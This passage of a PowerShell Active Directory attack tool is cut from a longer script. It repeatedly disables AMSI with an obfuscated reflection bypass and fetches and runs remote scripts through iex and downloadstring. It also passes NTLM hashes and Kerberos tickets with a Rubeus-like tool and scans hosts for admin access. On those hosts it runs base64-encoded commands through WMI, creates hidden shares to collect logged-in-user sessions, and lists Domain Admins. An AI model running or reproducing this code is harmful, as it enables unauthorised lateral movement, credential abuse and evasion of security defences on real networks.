						S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
						iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Exc.ps1')
						$SMBAdminAccessOn = Invoke-Exc -Target $SMBComputer -Username $SMBExecUsername -Hash $DomainHASH
						if($SMBAdminAccessOn -Like "* failed to authenticate on *"){}
						elseif($SMBAdminAccessOn -Like "* has Service Control Manager write privilege on *"){
							Write-Output "$SMBComputer"
						}
						else{
							Write-Host ""
							Write-Host "Some error.. Please check you entered the correct info"
							break
						}
					} -ArgumentList $pwd, $SMBExecUsername, $DomainHASH, $_
				}

				Wait-Job $computerpathjobs > $null
				
				# Retrieve the IPs
				$WMIAdminAccess = Receive-Job $computerpathjobs

				# Remove the jobs
				Remove-Job $computerpathjobs

				if([String]::IsNullOrWhiteSpace(($WMIAdminAccess)) -eq "True"){
					Write-Host "No Access"
					Write-Host ""
					break
				}
				else{
					$WMIAdminAccess.Replace(".$jcurrentdomain","")
				}
				
			}
			
			else{
				
				Write-Host "$SMBExecUsername has Local Admin access on:" -ForegroundColor Yellow
				
				$PwshModule = (Get-Module)
				if($PwshModule -Like "*dynamic*code*module*Microsoft*"){}
				else{
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
					Import-ActiveDirectory
				}
				
				$AllComputersEnabled = (Get-ADComputer -Filter {enabled -eq "true"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
				$AllComputersEnabled = $AllComputersEnabled | Where-Object {-not ($_ -cmatch "$env:computername")}
				$AllComputersEnabled = $AllComputersEnabled | Where-Object {-not ($_ -match "$env:computername")}
				$AllComputersEnabled = $AllComputersEnabled | Where-Object {$_ -ne "$env:computername"}
				$AllComputersEnabled = $AllComputersEnabled | Where-Object {$_ -ne "$env:computername.$jcurrentdomain"}
				
				# test connection
				
				$reachable_hosts = $null
				$Tasks = $null
				$total = $AllComputersEnabled.Count
				$count = 0

				$Tasks = $AllComputersEnabled | % {
					Write-Progress -Activity "Scanning Ports" -Status "$count out of $total hosts scanned" -PercentComplete ($count / $total * 100)
					$tcpClient = New-Object System.Net.Sockets.TcpClient
					$asyncResult = $tcpClient.BeginConnect($_, 135, $null, $null)
					$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
					if($wait) {
						$tcpClient.EndConnect($asyncResult)
						$tcpClient.Close()
						$reachable_hosts += ($_ + "`n")
					} else {}
					$count++
				}

				Write-Progress -Activity "Checking Hosts..." -Completed

				$reachable_hosts = ($reachable_hosts | Out-String) -split "`n"
				$reachable_hosts = $reachable_hosts | Where-Object { $_ -ne "" }
				
				if([String]::IsNullOrWhiteSpace(($reachable_hosts)) -eq "True"){
					Write-Host "No Hosts Alive.."
					Write-Host ""
					break
				}
				
				else{
					$SMBAliveComputers = $reachable_hosts
					$SMBAliveComputers = ($SMBAliveComputers | Out-String) -split "`n"
					$SMBAliveComputers = $SMBAliveComputers.Trim()
					$SMBAliveComputers = $SMBAliveComputers | Where-Object { $_ -ne "" }
				}
				
				# forloop
				
				$WMIAdminAccess = $null
				
				$allcomputerjobs = $SMBAliveComputers | ForEach-Object {
					Start-Job -ScriptBlock {
						param($pwd, $SMBExecUsername, $DomainHASH, $SMBAliveComputer)
						S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
						iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Exc.ps1')
						$SMBAdminAccessOn = Invoke-Exc -Target $SMBAliveComputer -Username $SMBExecUsername -Hash $DomainHASH
						if($SMBAdminAccessOn -Like "* failed to authenticate on *"){}
						elseif($SMBAdminAccessOn -Like "* has Service Control Manager write privilege on *"){
							Write-Output "$SMBAliveComputer"
						}
						else{
							Write-Host ""
							Write-Host "Some error.. Please check you entered the correct info"
						}
					} -ArgumentList $pwd, $SMBExecUsername, $DomainHASH, $_
				}

				Wait-Job $allcomputerjobs > $null
				
				# Retrieve the value of $WMIAdminAccessIPs from each job and store it in the same variable
				
				$WMIAdminAccess = Receive-Job $allcomputerjobs

				# Remove the jobs
				Remove-Job $allcomputerjobs

				if([String]::IsNullOrWhiteSpace(($WMIAdminAccess)) -eq "True"){
					Write-Host "No Access"
					Write-Host ""
					break
				}
				else{
					$WMIAdminAccess.Replace(".$jcurrentdomain","")
				}
		
			}
		}
		
		else{
			
			Write-Host "Domain is set to: " -ForegroundColor Cyan -NoNewline; Write-Host "$jcurrentdomain" -ForegroundColor Yellow
			Write-Host "Do you want to specify a different domain for the User to impersonate ?"
			Write-Host "(Leave blank for " -NoNewline; 
			Write-Host "$jcurrentdomain" -ForegroundColor Yellow -NoNewline;
			Write-Host " or provide " -NoNewline;
			Write-Host "FQDN" -ForegroundColor Yellow -NoNewline;
			Write-Host ")"
			$jtargetdomain = Read-Host
			
			Write-Host ""
			
			# Request ticket and import, then continue script
			
			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null

			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
			
			$CurrentUserTicket = Invoke-Ribes -Command "tgtdeleg /nowrap" | Out-String
			$OriginalUserTicket = $CurrentUserTicket.Substring($CurrentUserTicket.IndexOf('doI'))
			$OriginalUserTicket = $OriginalUserTicket.Trim()
			$currentuserpassword = $OriginalUserTicket
			
			if($DomainHASH.length -eq 32) {
				
				if($jtargetdomain){
					$RubUsername = $Username.Split("\")[1].Trim()
					klist purge > $null
					Invoke-Ribes -Command "asktgt /user:$RubUsername /rc4:$DomainHASH /domain:$jtargetdomain /ptt" > $null
				}
				
				else{
					$RubUsername = $Username.Split("\")[1].Trim()
					klist purge > $null
					Invoke-Ribes -Command "asktgt /user:$RubUsername /rc4:$DomainHASH /domain:$jcurrentdomain /ptt" > $null
				}
			}
			
			elseif($DomainHASH.length -eq 64) {
				
				if($jtargetdomain){
					$RubUsername = $Username.Split("\")[1].Trim()
					klist purge > $null
					Invoke-Ribes -Command "asktgt /user:$RubUsername /domain:$jtargetdomain /aes256:$DomainHASH /opsec /ptt" > $null
				}
				
				else{
					$RubUsername = $Username.Split("\")[1].Trim()
					klist purge > $null
					Invoke-Ribes -Command "asktgt /user:$RubUsername /aes256:$DomainHASH /domain:$jcurrentdomain /opsec /ptt" > $null
				}
			}
			
			if($TargetsPath.Contains("-ComputerName")){
				$TargetsPath = $TargetsPath.Replace("-ComputerName ","")
				Find-WMILocalAdminAccess -ComputerName $TargetsPath -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
			}
			
			elseif($TargetsPath -eq "Servers"){
				$PwshModule = (Get-Module)
				if($PwshModule -Like "*dynamic*code*module*Microsoft*"){
					$Servers = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -like "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $Servers -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
				}
				else{
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
					Import-ActiveDirectory
					$Servers = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -like "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $Servers -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
				}
			}
			
			elseif($TargetsPath -eq "Workstations"){
				$PwshModule = (Get-Module)
				if($PwshModule -Like "*dynamic*code*module*Microsoft*"){
					$Workstations = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -notlike "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $Workstations -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
				}
				else{
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
					Import-ActiveDirectory
					$Workstations = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -notlike "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $Workstations -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
				}
			}
			
			elseif($TargetsPath){
				$UserTargets = (Get-Content -Path $TargetsPath)
				Find-WMILocalAdminAccess -ComputerFile $UserTargets -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
			}
			
			else{
				$PwshModule = (Get-Module)
				if($PwshModule -Like "*dynamic*code*module*Microsoft*"){
					$AllADObjects = (Get-ADComputer -Filter {enabled -eq "true"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $AllADObjects -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
				}
				else{
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
					Import-ActiveDirectory
					$AllADObjects = (Get-ADComputer -Filter {enabled -eq "true"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $AllADObjects -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
				}
			}
		}
	}
	
	elseif($HASHorPassword -eq "Ticket"){
		Write-Host ""
		Write-Host "Base64Ticket: "  -ForegroundColor Yellow -NoNewline;
		$DomainRubTicket = Read-Host
		
		Write-Host ""
		
		# Import Ticket
		
		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null

		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
		
		$CurrentUserTicket = Invoke-Ribes -Command "tgtdeleg /nowrap" | Out-String
		$OriginalUserTicket = $CurrentUserTicket.Substring($CurrentUserTicket.IndexOf('doI'))
		$OriginalUserTicket = $OriginalUserTicket.Trim()
		$currentuserpassword = $OriginalUserTicket
		
		Invoke-Ribes -Command "ptt /ticket:$DomainRubTicket" > $null
		
		if($TargetsPath.Contains("-ComputerName")){
			$TargetsPath = $TargetsPath.Replace("-ComputerName ","")
			Find-WMILocalAdminAccess -ComputerName $TargetsPath -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
		}
		
		elseif($TargetsPath -eq "Servers"){
			$PwshModule = (Get-Module)
			if($PwshModule -Like "*dynamic*code*module*Microsoft*"){
				$Servers = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -like "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
				Find-WMILocalAdminAccess -ComputerFile $Servers -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
			}
			else{
				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
				Import-ActiveDirectory
				$Servers = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -like "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
				Find-WMILocalAdminAccess -ComputerFile $Servers -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
			}
		}
		
		elseif($TargetsPath -eq "Workstations"){
			$PwshModule = (Get-Module)
			if($PwshModule -Like "*dynamic*code*module*Microsoft*"){
				$Workstations = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -notlike "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
				Find-WMILocalAdminAccess -ComputerFile $Workstations -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
			}
			else{
				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
				Import-ActiveDirectory
				$Workstations = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -notlike "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
				Find-WMILocalAdminAccess -ComputerFile $Workstations -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
			}
		}
		
		elseif($TargetsPath){
			$UserTargets = (Get-Content -Path $TargetsPath)
			Find-WMILocalAdminAccess -ComputerFile $UserTargets -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
		}
		
		else{
			$PwshModule = (Get-Module)
			if($PwshModule -Like "*dynamic*code*module*Microsoft*"){
				$AllADObjects = (Get-ADComputer -Filter {enabled -eq "true"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
				Find-WMILocalAdminAccess -ComputerFile $AllADObjects -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
			}
			else{
				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
				Import-ActiveDirectory
				$AllADObjects = (Get-ADComputer -Filter {enabled -eq "true"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
				Find-WMILocalAdminAccess -ComputerFile $AllADObjects -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
			}
		}
	}
}

else{	
	if($TargetsPath.Contains("-ComputerName")){
		$TargetsPath = $TargetsPath.Replace("-ComputerName ","")
		Find-WMILocalAdminAccess -ComputerName $TargetsPath
	}
	
	elseif($TargetsPath -eq "Servers"){
		$PwshModule = (Get-Module)
		if($PwshModule -Like "*dynamic*code*module*Microsoft*"){
			$Servers = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -like "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
			Find-WMILocalAdminAccess -ComputerFile $Servers
		}
		else{
			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
			Import-ActiveDirectory
			$Servers = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -like "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
			Find-WMILocalAdminAccess -ComputerFile $Servers
		}
	}
	
	elseif($TargetsPath -eq "Workstations"){
		$PwshModule = (Get-Module)
		if($PwshModule -Like "*dynamic*code*module*Microsoft*"){
			$Workstations = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -notlike "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
			Find-WMILocalAdminAccess -ComputerFile $Workstations
		}
		else{
			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
			Import-ActiveDirectory
			$Workstations = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -notlike "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
			Find-WMILocalAdminAccess -ComputerFile $Workstations
		}
	}
	
	elseif($TargetsPath){
		$UserTargets = (Get-Content -Path $TargetsPath)
		Find-WMILocalAdminAccess -ComputerFile $UserTargets
	}
	
	else{
		$PwshModule = (Get-Module)
		if($PwshModule -Like "*dynamic*code*module*Microsoft*"){
			$AllADObjects = (Get-ADComputer -Filter {enabled -eq "true"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
			Find-WMILocalAdminAccess -ComputerFile $AllADObjects
		}
		else{
			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
			Import-ActiveDirectory
			$AllADObjects = (Get-ADComputer -Filter {enabled -eq "true"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
			Find-WMILocalAdminAccess -ComputerFile $AllADObjects
		}
	}
}

#####################################
#####################################
#####################################

Write-Host ""
Write-Host "Checking for Logon Sessions..." -ForegroundColor Yellow

if(($Username) -AND ($HASHorPassword) -eq "Password"){
	
	$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force -ErrorAction SilentlyContinue

	$cred = New-Object System.Management.Automation.PSCredential($Username,$SecPassword)
	
}

# Create 8 Random Characters

$eightrandom = ((97..122) | Get-Random -Count 8 | % {[char]$_})
$eightrandom = $eightrandom -join ""

$LoggedInUsers = $null

$WMITargets = $null
$WMITargets = ($WMIAdminAccess | Out-String) -split "`n"
$WMITargets = $WMITargets.Trim()
$WMITargets = $WMITargets | Where-Object { $_ -ne "" }

if($Username){		
	$SMBExecDomain = $Username.Split("\")[0].Trim()
					
	$SMBExecUsername = $Username.Split("\")[1].Trim()
}

if($UserName){
	if($HASHorPassword -eq "Password"){
		
		if($Username.Contains(".\")){
			
			$WMITargets | ForEach-Object {
				
				$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom"
		
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				$processCommand = "powershell.exe -ep bypass -enc $base64command"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
				
				Start-Sleep 1
				
				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Get-LoggedInUser.ps1""); Get-LoggedInUser > c:\Users\Public\$eightrandom\$_-LoggedInUsers.txt"
				
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\logons.txt`" -Value $base64command"
				
				$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
				
				$processCommand = "powershell.exe -ep bypass -enc $base64command2"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
				
				Start-Sleep 1
				
				$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\logons.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
				
				$processCommand2 = "powershell.exe -Command $Command2"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
			
			}
			
			Start-Sleep -Seconds 2
			
			$WMITargets | ForEach-Object {
				New-SmbMapping -RemotePath "\\$_\$eightrandom$" -Username "$UserName" -Password "$Password" -ErrorAction SilentlyContinue > $null
			}
			
			# Retrieve the file
			
			$allLogResults = $null
			
			$WMITargets | ForEach-Object {
				
				$allLogResults += ((type \\$_\$eightrandom$\$_-LoggedInUsers.txt) + "`n")
				
			}
			
		}
			
		else{
			
			# Use Get-LoggedInUser script
			iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Leo4j/Tools/main/Get-LoggedInUser.ps1")

			# Read the file and store the host names in an array
			$AdminAccessComputers = $null
			
			$AdminAccessComputers = ($WMIAdminAccess | Out-String) -split "`n"
			
			$AdminAccessComputers = $AdminAccessComputers.Trim()
			
			$AdminAccessComputers = $AdminAccessComputers | Where-Object { $_ -ne "" }

			# Join the array of host names with a comma
			$AdminAccessComputersString = $AdminAccessComputers -join ","

			# Construct the Get-LoggedInUser command
			$AdminAccessComputersCommand = "Get-LoggedInUser -ComputerName $AdminAccessComputersString"

			# Run the command
			$allLogResults = (Invoke-Expression $AdminAccessComputersCommand)
			
			$allLogResults = ($allLogResults | Out-String) -split "`n"

		}
	}
	
	elseif($HASHorPassword -eq "HASH"){
		
		if($Username.Contains(".\")){
				
			# Get Logged Users
				
			$loggedinusershashjob = $WMITargets | ForEach-Object {
				
				$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom"
			
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				$commandtoencode2 = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Get-LoggedInUser.ps1""); Get-LoggedInUser > c:\Users\Public\$eightrandom\$_-LoggedInUsers.txt"
				
				$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode2))
				
				$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\logons.txt`" -Value $base64command2"
				
				$base64command3 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
				
				$FinalCommand = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\logons.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
				
				Start-Job -ScriptBlock {
					param($pwd, $base64command, $base64command3, $FinalCommand, $SMBExecUsername, $DomainHASH, $WMITarget)
					S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Exc.ps1')
					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -enc $base64command"
					Start-Sleep 1
					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -enc $base64command3"
					Start-Sleep 1
					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -Command $FinalCommand"
				} -ArgumentList $pwd, $base64command, $base64command3, $FinalCommand, $SMBExecUsername, $DomainHASH, $_
			}

			Wait-Job $loggedinusershashjob > $null
			
			Remove-Job $loggedinusershashjob > $null
			
			Start-Sleep -Seconds 5
			
			# Retrieve the file
				
			$loggedinusershashretrievejob = $WMITargets | ForEach-Object {
				Start-Job -ScriptBlock {
					param($pwd, $SMBExecUsername, $DomainHASH, $eightrandom, $WMITarget)
					S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Client.ps1')
					Invoke-Client -Username $SMBExecUsername -Hash $DomainHASH -Action Get -Source \\$WMITarget\$eightrandom$\$WMITarget-LoggedInUsers.txt -Destination $pwd\$WMITarget-LoggedInUsers.txt
				} -ArgumentList $pwd, $SMBExecUsername, $DomainHASH, $eightrandom, $_
			}

			Wait-Job $loggedinusershashretrievejob > $null
			
			Remove-Job $loggedinusershashretrievejob > $null
				
			if(Test-Path -Path $pwd\*LoggedInUsers.txt){

				# Merge Files

				$allLogResults = Get-Content $pwd\*-LoggedInUsers.txt

				del $pwd\*-LoggedInUsers.txt

			}
			
		}
		
		else{
			
			# Use Get-LoggedInUser script
			iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Leo4j/Tools/main/Get-LoggedInUser.ps1")

			# Read the file and store the host names in an array
			$AdminAccessComputers = $null
			
			$AdminAccessComputers = ($WMIAdminAccess | Out-String) -split "`n"
			
			$AdminAccessComputers = $AdminAccessComputers.Trim()
			
			$AdminAccessComputers = $AdminAccessComputers | Where-Object { $_ -ne "" }

			# Join the array of host names with a comma
			$AdminAccessComputersString = $AdminAccessComputers -join ","

			# Construct the Get-LoggedInUser command
			$AdminAccessComputersCommand = "Get-LoggedInUser -ComputerName $AdminAccessComputersString"

			# Run the command
			$allLogResults = (Invoke-Expression $AdminAccessComputersCommand)
			
			$allLogResults = ($allLogResults | Out-String) -split "`n"
		}

	}
	
	elseif($HASHorPassword -eq "Ticket"){
		
		# Use Get-LoggedInUser script
		iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Leo4j/Tools/main/Get-LoggedInUser.ps1")

		# Read the file and store the host names in an array
		$AdminAccessComputers = $null
			
		$AdminAccessComputers = ($WMIAdminAccess | Out-String) -split "`n"
			
		$AdminAccessComputers = $AdminAccessComputers.Trim()
			
		$AdminAccessComputers = $AdminAccessComputers | Where-Object { $_ -ne "" }

		# Join the array of host names with a comma
		$AdminAccessComputersString = $AdminAccessComputers -join ","

		# Construct the Get-LoggedInUser command
		$AdminAccessComputersCommand = "Get-LoggedInUser -ComputerName $AdminAccessComputersString"

		# Run the command
		$allLogResults = (Invoke-Expression $AdminAccessComputersCommand)
		
		$allLogResults = ($allLogResults | Out-String) -split "`n"
	}
}

else{
	
	# Use Get-LoggedInUser script
	iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Leo4j/Tools/main/Get-LoggedInUser.ps1")

	# Read the file and store the host names in an array
	$AdminAccessComputers = $null
			
	$AdminAccessComputers = ($WMIAdminAccess | Out-String) -split "`n"
			
	$AdminAccessComputers = $AdminAccessComputers.Trim()
			
	$AdminAccessComputers = $AdminAccessComputers | Where-Object { $_ -ne "" }

	# Join the array of host names with a comma
	$AdminAccessComputersString = $AdminAccessComputers -join ","

	# Construct the Get-LoggedInUser command
	$AdminAccessComputersCommand = "Get-LoggedInUser -ComputerName $AdminAccessComputersString"

	# Run the command
	$allLogResults = (Invoke-Expression $AdminAccessComputersCommand)
	
	$allLogResults = ($allLogResults | Out-String) -split "`n"
	
}

# Print Sessions

if([String]::IsNullOrWhiteSpace(($allLogResults)) -eq "True"){
	Write-Host "No Sessions..."
	Write-Host ""
}

else{
	
	$jcurrentdomainUP = $jcurrentdomain.ToUpper()

	$Lines = ($allLogResults | Out-String) -split "`n"

	$LogObject = ForEach($line in $Lines){
		if($line.Contains("ComputerName")){
			$LogComputerName = $line.Split(":")[1].Trim()
		}
		elseif($line.Contains("UserName")){
			$LogUserName = $line.Split(":")[1].Trim()
		}
		elseif($line.Contains("SessionState")){
			$LogSessionState = $line.Split(":")[1].Trim()
		}
				
		if($LogComputerName -AND $LogUserName -AND $LogSessionState){
			[pscustomObject]@{
				HostName = $LogComputerName.Replace(".$jcurrentdomainUP","")
				UserName = $LogUserName
				SessionState = $LogSessionState
			}
				
			$LogComputerName = $null
			$LogUserName = $null
			$LogSessionState = $null
		}
	}
			
	$LogObject | Format-Table

}

Write-Host "#######################"
Write-Host "#" -ForegroundColor Red -NoNewline;
Write-Host " Admins and Sessions " -NoNewline;
Write-Host "#" -ForegroundColor Red;
Write-Host "#######################"
Write-Host ""

##### Show Domain and Enterprise Admins

$PwshModule = (Get-Module)
if($PwshModule -Like "*dynamic*code*module*Microsoft*"){}

else{
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
	Import-ActiveDirectory
}

$DomainAdmins = (Get-ADGroupMember -Identity "Domain Admins" -Recursive | select-object -ExpandProperty SamAccountName)

